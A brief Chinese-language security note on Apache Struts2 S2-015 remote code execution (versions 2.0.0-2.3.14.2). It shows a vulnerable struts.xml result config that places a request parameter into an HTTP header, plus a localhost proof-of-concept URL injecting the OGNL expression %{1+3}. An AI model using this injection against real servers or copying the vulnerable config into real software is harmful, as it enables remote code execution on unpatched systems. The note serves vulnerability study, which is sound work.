# Struts2远程代码执行

受影响版本:

- 2.0.0-2.3.14.2

详情[参看](https://cwiki.apache.org/confluence/display/WW/S2-015)
原因在于struts2.xml配置中有如下的配置:

```
<action name="HelloWorld" class="struts2demo.action.HelloWorldAction">
    <result type="httpheader">
    	<param name="headers.foobar">${q}</param>
    </result>
</action>
```

为HTTP头信息设置了1个foobar的头信息。  

POC过程:

<pre>
http://127.0.0.1:8080/struts2demo/HelloWorld.action?q=%25%7B1%2B3%7D
</pre>

请求头中的foobar的数值为4